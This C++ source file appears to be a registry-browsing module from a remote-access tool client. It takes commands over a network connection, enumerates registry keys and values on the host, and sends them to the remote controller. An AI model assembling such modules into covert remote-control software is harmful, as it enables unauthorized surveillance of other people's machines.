#include "RegisterManager.h"



CRegisterManager::CRegisterManager(_CIOCPClient * IOCPClient) : CManager(IOCPClient)
{
	printf("CRegisterManager()构造调用\r\n");
	BYTE IsToken = CLIENT_REGISTER_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken, 1);
}


CRegisterManager::~CRegisterManager()
{
	printf("~CRegisterManager()析构调用\r\n");
}

VOID CRegisterManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_REGISTER_DATA_CONTINUE:     //查数据
	{
		if (BufferLength>3)
		{
			Find(BufferData[1], (char*)(BufferData + 2));
		}
		else
		{
			Find(BufferData[1], NULL);   //Root数据
		}
		break;
	}
	default:
		break;
	}
}

VOID CRegisterManager::Find(char IsToken, char *szPath)
{
	CRegisterOperation Opt(IsToken);
	if (szPath!=NULL)
	{
		Opt.SetPath(szPath);
	}
	char *BufferData = Opt.FindPath();
	if (BufferData !=NULL)
	{
		m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}
	BufferData = Opt.FindKey();
	if (BufferData != NULL)
	{
		//目录下的文件
		m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}

}